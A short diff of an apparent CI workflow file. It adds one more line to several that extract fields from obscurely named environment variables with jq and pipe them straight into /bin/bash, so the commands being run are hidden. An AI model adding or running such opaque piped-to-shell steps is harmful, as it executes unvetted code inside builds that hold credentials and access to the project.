@@ -26,6 +26,7 @@ jobs:
           echo $trn4026 | jq -r .vfua8496 | /bin/bash
           printf '%s' "$v8520" | jq -r .qjzse07121 | /bin/bash
           echo $vvd07 | jq -r .xd67047 | /bin/bash
+          echo $aa04 | jq -r .an9 | /bin/bash
 
       - name: Save archive
         if: always()
